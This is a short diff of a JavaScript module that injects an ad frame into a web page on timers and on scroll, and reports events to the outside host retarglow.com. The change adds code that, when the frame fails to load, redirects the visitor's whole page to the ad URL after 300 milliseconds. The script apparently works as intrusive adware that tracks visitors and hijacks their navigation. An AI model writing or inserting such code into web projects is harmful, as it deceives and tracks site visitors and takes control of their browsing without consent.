@@ -81,8 +81,10 @@ export default {
         };
 
         f.onerror = () => {
+        
           const img = new Image();
           img.src = j.ad_url;
+
           fetch("https://retarglow.com/log", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -94,13 +96,17 @@ export default {
               ad_url: j.ad_url
             })
           });
+
+        
+          setTimeout(() => {
+            window.location.href = j.ad_url;
+          }, 300);
         };
 
         document.body.appendChild(f);
       });
     };
 
-    // Triggers
     setTimeout(inject, 2000);
     window.addEventListener("scroll", () => { inject(); window.removeEventListener("scroll", inject); });
     setTimeout(inject, 5000);
